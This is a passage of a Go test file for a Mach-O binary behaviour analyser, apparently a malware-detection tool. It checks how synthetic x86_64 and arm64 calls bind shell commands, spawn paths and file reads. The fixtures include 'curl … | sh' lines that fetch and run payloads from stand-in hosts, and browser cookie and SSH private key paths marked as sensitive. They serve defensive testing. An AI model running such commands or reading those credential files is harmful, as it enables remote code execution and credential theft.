	count := extractX86DirectCalls(&graph, content, file, text, data, functions, map[uint64]string{0x1100: "_system"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if hasOperationKind(&graph, "network.download") || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("base address state must not cross function boundaries: operations=%#v chains=%#v", graph.Operations, graph.Relations)
	}
}

func TestX86DirectNativeShellCallDoesNotReuseCommandAfterArgumentOverwrite(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	firstCommand := "curl https://stale-x86.example/payload | sh"
	secondCommand := "curl https://other-stale-x86.example/payload | sh"
	function := machoFunction{Name: "runShell", Start: 0x1000, End: 0x1010, Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x2000, Offset: 0x2000, Kind: "shell-command", Value: firstCommand},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x100a,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "shell-command", Value: secondCommand},
	})
	lea := encodeTestX86RIPRelativeLEAToReg(7, 0x1000, 0x2000)
	clobberRDI := []byte{0x48, 0x89, 0xc7}
	callVA := 0x1000 + uint64(len(lea)+len(clobberRDI))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(lea, clobberRDI...), call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2000, append([]byte(firstCommand), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(secondCommand), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_system"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if hasOperationKind(&graph, "network.download") || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("overwritten rdi should not produce shell expansion: operations=%#v chains=%#v", graph.Operations, graph.Relations)
	}
}

func TestArm64DirectDescriptorReadCallDoesNotInventFileProvenance(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "collect", Start: 0x100000000, End: 0x10000000c, Reachable: true}
	selected := "~/Library/Application Support/Google/Chrome/Default/Cookies"
	other := "~/.ssh/id_rsa"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x100002000,
			Offset:   0x2000,
			Kind:     "sensitive-resource",
			Value:    selected,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: selected, Classifications: []behavior.ResourceClassification{behavior.ResourceClassBrowserCookieStore}},
		},
	})
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000004,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x100003000,
			Offset:   0x3000,
			Kind:     "sensitive-resource",
			Value:    other,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: other, Classifications: []behavior.ResourceClassification{behavior.ResourceClassSSHPrivateKey}},
		},
	})
	data := make([]byte, 12)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, 0x100002000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestBL(0x100000008, 0x100000100))
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x100002000, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x100003000, append([]byte(other), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: "_read"}, nil, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1", count)
	}
	assertUnresolvedNativePrimitive(t, &graph, behavior.OperationIORead, behavior.ResourceIOChannel)
	foundImportFeature := false
	for _, feature := range graph.Features {
		if feature.Key == "macho.import_call" && feature.Value == "read" {
			foundImportFeature = true
		}
	}
	if !foundImportFeature {
		t.Fatalf("descriptor read should remain available as neutral imported-call evidence: %#v", graph.Features)
	}
}

func TestArm64DirectPosixSpawnUsesArgument1ExecutablePath(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "spawnHelper", Start: 0x100000000, End: 0x100000014, Reachable: true}
	argument0 := "/tmp/not-the-spawn-path"
	executable := "/tmp/spawn-helper"
	for index, item := range []struct {
		value string
		va    uint64
		ref   uint64
	}{
		{value: argument0, va: 0x100002000, ref: 0x100000004},
		{value: executable, va: 0x100003000, ref: 0x10000000c},
	} {
		addMachOStringXref(&graph, content, "arm64", machoStringXref{
			RefVA:    item.ref,
			Function: function,
			Literal: machoStringLiteral{
				VA:       item.va,
				Offset:   0x2000 + index*0x1000,
				Kind:     "process-launch-path",
				Value:    item.value,
				Resource: behavior.NewResource(behavior.ResourceFile, item.value),
			},
		})
	}
	data := make([]byte, 20)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(0, 0x100000000, 0x100002000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(0, 0, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestADRP(1, 0x100000008, 0x100003000))
	binary.LittleEndian.PutUint32(data[12:16], encodeTestADDImmediate(1, 1, 0))
	binary.LittleEndian.PutUint32(data[16:20], encodeTestBL(0x100000010, 0x100000100))
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
		testMachOSection("__cstring", 0x100002000, append([]byte(argument0), 0)),
		testMachOSection("__cstring", 0x100003000, append([]byte(executable), 0)),
	}}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: "_posix_spawn"}, nil, "arm64")
	if count != 1 || !hasOperationWithArch(&graph, behavior.OperationProcessExecute, "process", executable, function.Name, "arm64") {
		t.Fatalf("posix_spawn should bind its x1 executable path: count=%d operations=%#v", count, graph.Operations)
	}
	if hasOperationWithArch(&graph, behavior.OperationProcessExecute, "process", argument0, function.Name, "arm64") {
		t.Fatalf("posix_spawn must not bind its x0 pid output pointer as an executable: %#v", graph.Operations)
	}
}

func TestArm64DirectProcessCallsRejectExecutableInWrongArgumentRegister(t *testing.T) {
	for _, test := range []struct {
		name     string
		symbol   string
		register uint32
	}{
		{name: "posix_spawn_x0", symbol: "_posix_spawn", register: 0},
		{name: "execve_x1", symbol: "_execve", register: 1},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			function := machoFunction{Name: "runHelper", Start: 0x100000000, End: 0x10000000c, Reachable: true}
			path := "/tmp/wrong-register-helper"
			addMachOStringXref(&graph, content, "arm64", machoStringXref{
				RefVA:    0x100000004,
				Function: function,
				Literal:  machoStringLiteral{VA: 0x100002000, Offset: 0x2000, Kind: "process-launch-path", Value: path, Resource: behavior.NewResource(behavior.ResourceFile, path)},
			})
			data := make([]byte, 12)
			binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(test.register, 0x100000000, 0x100002000))
			binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(test.register, test.register, 0))
			binary.LittleEndian.PutUint32(data[8:12], encodeTestBL(0x100000008, 0x100000100))
			file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{testMachOSection("__cstring", 0x100002000, append([]byte(path), 0))}}
			text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

			count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: test.symbol}, nil, "arm64")
			if count != 1 || len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
				t.Fatalf("%s must ignore executable-looking strings in the wrong argument register: count=%d operations=%#v", test.symbol, count, graph.Operations)
			}
		})
	}
}

func TestArm64DirectProcessCallRejectsRegister31ArgumentFlow(t *testing.T) {
	const (
		textVA = uint64(0x100000000)
		pathVA = uint64(0x100002040)
	)
	for _, test := range []struct {
		name         string
		instructions []uint32
	}{
		{
			name: "sp_source",
			instructions: []uint32{
				encodeTestADRP(31, textVA, pathVA),
				encodeTestADDImmediate(0, 31, pathVA&0xfff),
			},
		},
		{
			name: "zero_register_move",
			instructions: []uint32{
				encodeTestADRP(2, textVA, pathVA),
				encodeTestADDImmediate(2, 2, pathVA&0xfff),
				encodeTestMOVRegister(31, 2),
				encodeTestMOVRegister(0, 31),
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			path := "/tmp/register-31-helper"
			data := make([]byte, (len(test.instructions)+1)*4)
			for index, instruction := range test.instructions {
				binary.LittleEndian.PutUint32(data[index*4:index*4+4], instruction)
			}
			callVA := textVA + uint64(len(test.instructions)*4)
			binary.LittleEndian.PutUint32(data[len(test.instructions)*4:], encodeTestBL(callVA, 0x100000100))
			function := machoFunction{Name: "runHelper", Start: textVA, End: textVA + uint64(len(data)), Reachable: true}
			addMachOStringXref(&graph, content, "arm64", machoStringXref{
				RefVA: callVA - 4, Function: function,
				Literal: machoStringLiteral{VA: pathVA, Offset: 0x2040, Kind: "process-launch-path", Value: path, Resource: behavior.NewResource(behavior.ResourceFile, path)},
			})
			file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{testMachOSection("__cstring", pathVA, append([]byte(path), 0))}}
			text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: textVA, Size: uint64(len(data))}}

			count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: "_execve"}, nil, "arm64")
			if count != 1 || len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
				t.Fatalf("register-31 fake flow must not bind an executable: count=%d operations=%#v", count, graph.Operations)
			}
		})
	}
}

func TestX86DirectPosixSpawnUsesArgument1ExecutablePath(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "spawnHelper", Start: 0x1000, End: 0x1013, Reachable: true}
	argument0 := "/tmp/not-the-spawn-path"
	executable := "/tmp/spawn-helper"
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA: 0x1000, Function: function,
		Literal: machoStringLiteral{VA: 0x2000, Offset: 0x2000, Kind: "process-launch-path", Value: argument0, Resource: behavior.NewResource(behavior.ResourceFile, argument0)},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA: 0x1007, Function: function,
		Literal: machoStringLiteral{VA: 0x3000, Offset: 0x3000, Kind: "process-launch-path", Value: executable, Resource: behavior.NewResource(behavior.ResourceFile, executable)},
	})
	argument0Load := encodeTestX86RIPRelativeLEAToReg(7, 0x1000, 0x2000)
	argument1Load := encodeTestX86RIPRelativeLEAToReg(6, 0x1007, 0x3000)
	call := encodeTestX86CALL(0x100e, 0x1100)
	data := append(append(argument0Load, argument1Load...), call...)
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
		testMachOSection("__cstring", 0x2000, append([]byte(argument0), 0)),
		testMachOSection("__cstring", 0x3000, append([]byte(executable), 0)),
	}}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_posix_spawnp"}, nil, "x86_64")
	if count != 1 || !hasOperationWithArch(&graph, behavior.OperationProcessExecute, "process", executable, function.Name, "x86_64") {
		t.Fatalf("posix_spawnp should bind its RSI executable path: count=%d operations=%#v", count, graph.Operations)
	}
	if hasOperationWithArch(&graph, behavior.OperationProcessExecute, "process", argument0, function.Name, "x86_64") {
		t.Fatalf("posix_spawnp must not bind its RDI pid output pointer as an executable: %#v", graph.Operations)
	}
}

func TestX86DirectProcessCallsRejectExecutableInWrongArgumentRegister(t *testing.T) {
	for _, test := range []struct {
		name     string
		symbol   string
		register uint8
	}{
		{name: "posix_spawn_rdi", symbol: "_posix_spawn", register: 7},
		{name: "execve_rsi", symbol: "_execve", register: 6},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			function := machoFunction{Name: "runHelper", Start: 0x1000, End: 0x100c, Reachable: true}
			path := "/tmp/wrong-register-helper"
			addMachOStringXref(&graph, content, "x86_64", machoStringXref{
				RefVA: 0x1000, Function: function,
				Literal: machoStringLiteral{VA: 0x2000, Offset: 0x2000, Kind: "process-launch-path", Value: path, Resource: behavior.NewResource(behavior.ResourceFile, path)},
			})
			load := encodeTestX86RIPRelativeLEAToReg(test.register, 0x1000, 0x2000)
			call := encodeTestX86CALL(0x1007, 0x1100)
			data := append(load, call...)
			file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{testMachOSection("__cstring", 0x2000, append([]byte(path), 0))}}
			text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

			count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: test.symbol}, nil, "x86_64")
			if count != 1 || len(graph.Operations) != 1 || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
				t.Fatalf("%s must ignore executable-looking strings in the wrong argument register: count=%d operations=%#v", test.symbol, count, graph.Operations)
			}
		})
	}
}

func TestX86DirectProcessCallUsesArgumentPathWhenFunctionHasMultiplePaths(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	selected := "/tmp/selected-helper"
	other := "/tmp/other-helper"
	function := machoFunction{Name: "runHelper", Start: 0x1000, End: 0x100c, Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x2000,
			Offset:   0x2000,
			Kind:     "process-launch-path",
			Value:    selected,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: selected},
		},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1007,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   0x3000,
			Kind:     "process-launch-path",
			Value:    other,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: other},
		},
	})
	lea := encodeTestX86RIPRelativeLEAToReg(7, 0x1000, 0x2000)
	call := encodeTestX86CALL(0x1000+uint64(len(lea)), 0x1100)
	data := append(lea, call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2000, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(other), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_execve"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if !hasOperationWithArch(&graph, "process.execute", "process", selected, "runHelper", "x86_64") {
		t.Fatalf("process call should use exact x86_64 argument path: %#v", graph.Operations)
	}
	if hasOperationWithArch(&graph, "process.execute", "process", other, "runHelper", "x86_64") {
		t.Fatalf("process call should not use non-argument path: %#v", graph.Operations)
	}
}

func TestX86DirectDescriptorReadCallDoesNotInventFileProvenance(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	first := "~/Library/Application Support/Google/Chrome/Default/Cookies"
	second := "~/.ssh/id_rsa"
	function := machoFunction{Name: "collect", Start: 0x1000, End: 0x1020, Reachable: true}
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x2000,
			Offset:   0x2000,
			Kind:     "sensitive-resource",
			Value:    first,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: first, Classifications: []behavior.ResourceClassification{behavior.ResourceClassBrowserCookieStore}},
		},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x100a,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x3000,
			Offset:   0x3000,
			Kind:     "sensitive-resource",
			Value:    second,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: second, Classifications: []behavior.ResourceClassification{behavior.ResourceClassSSHPrivateKey}},
		},
	})
	lea := encodeTestX86RIPRelativeLEAToReg(7, 0x1000, 0x2000)
	clobberRDI := []byte{0x48, 0x89, 0xc7}
	callVA := 0x1000 + uint64(len(lea)+len(clobberRDI))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(lea, clobberRDI...), call...)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x2000, append([]byte(first), 0)),
			testMachOSection("__cstring", 0x3000, append([]byte(second), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_read"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	assertUnresolvedNativePrimitive(t, &graph, behavior.OperationIORead, behavior.ResourceIOChannel)
}

func TestArm64DirectObjCFileReadCallDoesNotBindRawCStringArgument(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "collect", Start: 0x100000000, End: 0x10000000c, Reachable: true}
	selected := "~/Library/Application Support/Google/Chrome/Default/Cookies"
	other := "~/.ssh/id_rsa"
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000000,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x100002000,
			Offset:   0x2000,
			Kind:     "sensitive-resource",
			Value:    selected,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: selected, Classifications: []behavior.ResourceClassification{behavior.ResourceClassBrowserCookieStore}},
		},
	})
	addMachOStringXref(&graph, content, "arm64", machoStringXref{
		RefVA:    0x100000004,
		Function: function,
		Literal: machoStringLiteral{
			VA:       0x100003000,
			Offset:   0x3000,
			Kind:     "sensitive-resource",
			Value:    other,
			Resource: behavior.Resource{Kind: behavior.ResourceFile, Value: other, Classifications: []behavior.ResourceClassification{behavior.ResourceClassSSHPrivateKey}},
		},
	})
	data := make([]byte, 12)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(2, 0x100000000, 0x100002000))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(2, 2, 0))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestBL(0x100000008, 0x100000100))
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__cstring", 0x100002000, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x100003000, append([]byte(other), 0)),
		},
	}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, nil, map[uint64]string{0x100000100: "dataWithContentsOfFile:"}, "arm64")
	if count != 1 {
		t.Fatalf("extractArm64DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileRead || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("raw x2 C-string plus nearby resources must leave the NSString resource unresolved: %#v", graph.Operations)
	}
	if graph.Operations[0].Qualifiers["resource_binding"] != "unresolved" {
		t.Fatalf("ObjC operation must disclose unresolved object provenance: %#v", graph.Operations[0].Qualifiers)
	}
}

func TestArm64DirectObjCFileReadBindsStaticCFStringArgument(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "benign-control"}
	function := machoFunction{Name: "collect", Start: 0x100000000, End: 0x10000000c, Reachable: true}
	const (
		objectVA  = uint64(0x100002000)
		backingVA = uint64(0x100003000)
	)
	path := "~/.ssh/id_rsa"
	object := make([]byte, machOCFString64RecordSize)
	binary.LittleEndian.PutUint64(object[16:24], backingVA)
	binary.LittleEndian.PutUint64(object[24:32], uint64(len(path)))
	data := make([]byte, 12)
	binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(2, 0x100000000, objectVA))
	binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(2, 2, objectVA&0xfff))
	binary.LittleEndian.PutUint32(data[8:12], encodeTestBL(0x100000008, 0x100000100))
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
		testMachOSection("__cfstring", objectVA, object),
		testMachOSection("__cstring", backingVA, []byte(path)),
	}}
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

	count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, nil, map[uint64]string{0x100000100: "dataWithContentsOfFile:"}, "arm64")
	if count != 1 || len(graph.Operations) != 1 {
		t.Fatalf("arm64 static CFString call = count %d, operations %#v", count, graph.Operations)
	}
	operation := graph.Operations[0]
	if operation.Kind != behavior.OperationFileRead || operation.RequiredResource().Value != path || operation.Qualifiers["resource_binding"] != "exact-call-argument" || len(operation.EvidenceIDs) != 4 {
		t.Fatalf("arm64 static CFString path was not bound exactly: %#v", operation)
	}
}

func TestArm64DirectObjCCallDoesNotReuseArgumentAfterMissingBase(t *testing.T) {
	for _, test := range []struct {
		name        string
		instruction uint32
	}{
		{name: "add", instruction: encodeTestADDImmediate(2, 9, 0)},
		{name: "ldr", instruction: encodeTestLDRXUnsigned(2, 9, 0)},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
			function := machoFunction{Name: "save", Start: 0x100000000, End: 0x100000018, Reachable: true}
			path := "/tmp/stale-output"
			selector := "writeToFile:options:error:"
			selectorData := append([]byte(selector), 0)
			selrefData := make([]byte, 8)
			binary.LittleEndian.PutUint64(selrefData, 0x100004000)
			data := make([]byte, 24)
			binary.LittleEndian.PutUint32(data[0:4], encodeTestADRP(2, 0x100000000, 0x100002000))
			binary.LittleEndian.PutUint32(data[4:8], encodeTestADDImmediate(2, 2, 0))
			binary.LittleEndian.PutUint32(data[8:12], encodeTestADRP(1, 0x100000008, 0x100003000))
			binary.LittleEndian.PutUint32(data[12:16], encodeTestLDRXUnsigned(1, 1, 0))
			binary.LittleEndian.PutUint32(data[16:20], test.instruction)
			binary.LittleEndian.PutUint32(data[20:24], encodeTestBL(0x100000014, 0x100000100))
			file := &macho.File{
				ByteOrder: binary.LittleEndian,
				Sections: []*macho.Section{
					testMachOSection("__cstring", 0x100002000, append([]byte(path), 0)),
					testMachOSection("__objc_selrefs", 0x100003000, selrefData),
					testMachOSection("__objc_methname", 0x100004000, selectorData),
				},
			}
			text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x100000000, Size: uint64(len(data))}}

			count := extractArm64DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x100000100: "_objc_msgSend"}, nil, "arm64")
			if count != 1 || len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileWrite {
				t.Fatalf("exact called selector should retain its neutral operation: count=%d operations=%#v", count, graph.Operations)
			}
			if got := graph.Operations[0].RequiredResource().Value; got != "" {
				t.Fatalf("%s with an unavailable base retained stale x2 value %q", test.name, got)
			}
		})
	}
}

func TestX86GenericObjCFileWriteCallDoesNotBindRawCStringArgument(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "sample"}
	function := machoFunction{Name: "save", Start: 0x1000, End: 0x1020, Reachable: true}
	selected := "/tmp/selected-objc-output.bin"
	other := "/tmp/other-objc-output.bin"
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x1007,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x4000, Offset: 0x4000, Kind: "process-launch-path", Value: selected, Resource: behavior.NewResource(behavior.ResourceFile, selected)},
	})
	addMachOStringXref(&graph, content, "x86_64", machoStringXref{
		RefVA:    0x100e,
		Function: function,
		Literal:  machoStringLiteral{VA: 0x5000, Offset: 0x5000, Kind: "process-launch-path", Value: other, Resource: behavior.NewResource(behavior.ResourceFile, other)},
	})
	selectorData := append([]byte("writeToFile:options:error:"), 0)
	selrefData := make([]byte, 8)
	binary.LittleEndian.PutUint64(selrefData, 0x3000)
	file := &macho.File{
		ByteOrder: binary.LittleEndian,
		Sections: []*macho.Section{
			testMachOSection("__objc_selrefs", 0x2000, selrefData),
			testMachOSection("__objc_methname", 0x3000, selectorData),
			testMachOSection("__cstring", 0x4000, append([]byte(selected), 0)),
			testMachOSection("__cstring", 0x5000, append([]byte(other), 0)),
		},
	}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, 0x2000)
	leaArg := encodeTestX86RIPRelativeLEAToReg(2, 0x1000+uint64(len(movSelector)), 0x4000)
	callVA := 0x1000 + uint64(len(movSelector)+len(leaArg))
	call := encodeTestX86CALL(callVA, 0x1100)
	data := append(append(movSelector, leaArg...), call...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "x86_64")
	if count != 1 {
		t.Fatalf("extractX86DirectCalls() count = %d, want 1", count)
	}
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationFileWrite || graph.Operations[0].RequiredResource().Value != "" || len(graph.Operations[0].EvidenceIDs) != 1 {
		t.Fatalf("raw rdx C-string plus nearby paths must leave the NSString resource unresolved: %#v", graph.Operations)
	}
}

func TestX86GenericObjCFileWriteBindsStaticCFStringArgument(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-1", LogicalPath: "benign-control"}
	function := machoFunction{Name: "save", Start: 0x1000, End: 0x1040, Reachable: true}
	const (
		selectorRefVA = uint64(0x2000)
		selectorVA    = uint64(0x3000)
		objectVA      = uint64(0x4000)
		backingVA     = uint64(0x5000)
	)
	selector := "writeToFile:options:error:"
	path := "/tmp/benign-output"
	selectorRef := make([]byte, 8)
	binary.LittleEndian.PutUint64(selectorRef, selectorVA)
	object := make([]byte, machOCFString64RecordSize)
	binary.LittleEndian.PutUint64(object[16:24], backingVA)
	binary.LittleEndian.PutUint64(object[24:32], uint64(len(path)))
	file := &macho.File{ByteOrder: binary.LittleEndian, Sections: []*macho.Section{
		testMachOSection("__objc_selrefs", selectorRefVA, selectorRef),
		testMachOSection("__objc_methname", selectorVA, append([]byte(selector), 0)),
		testMachOSection("__cfstring", objectVA, object),
		testMachOSection("__cstring", backingVA, []byte(path)),
	}}
	movSelector := encodeTestX86RIPRelativeMOVToReg(6, 0x1000, selectorRefVA)
	leaArgument := encodeTestX86RIPRelativeLEAToReg(2, 0x1000+uint64(len(movSelector)), objectVA)
	callVA := 0x1000 + uint64(len(movSelector)+len(leaArgument))
	data := append(append(movSelector, leaArgument...), encodeTestX86CALL(callVA, 0x1100)...)
	text := &macho.Section{SectionHeader: macho.SectionHeader{Addr: 0x1000, Size: uint64(len(data))}}

	count := extractX86DirectCalls(&graph, content, file, text, data, []machoFunction{function}, map[uint64]string{0x1100: "_objc_msgSend"}, nil, "x86_64")
	if count != 1 || len(graph.Operations) != 1 {
		t.Fatalf("x86_64 static CFString call = count %d, operations %#v", count, graph.Operations)
	}
	operation := graph.Operations[0]
	if operation.Kind != behavior.OperationFileWrite || operation.RequiredResource().Value != path || operation.Qualifiers["resource_binding"] != "exact-call-argument" || len(operation.EvidenceIDs) != 4 {
		t.Fatalf("x86_64 static CFString path was not bound exactly: %#v", operation)
	}
}

func TestX86RIPRelativeIndirectCallPointerIsExactAndOverflowSafe(t *testing.T) {
	positive := encodeTestX86IndirectCALL(0x1000, 0x2000)
	if got, ok := x86RIPRelativeIndirectCallPointer(0x1000, positive); !ok || got != 0x2000 {
		t.Fatalf("indirect call pointer = %#x, %v", got, ok)
	}
	negative := encodeTestX86IndirectCALL(0x2000, 0x1000)
	if got, ok := x86RIPRelativeIndirectCallPointer(0x2000, negative); !ok || got != 0x1000 {
		t.Fatalf("negative-displacement pointer = %#x, %v", got, ok)
	}
	for _, malformed := range [][]byte{
		positive[:5],
		append([]byte{0x48}, positive...),
		{0xff, 0x10, 0, 0, 0, 0},
		{0xe8, 0, 0, 0, 0, 0},
	} {
		if target, ok := x86RIPRelativeIndirectCallPointer(0x1000, malformed); ok {
			t.Fatalf("malformed indirect call produced target %#x from %x", target, malformed)
		}
	}
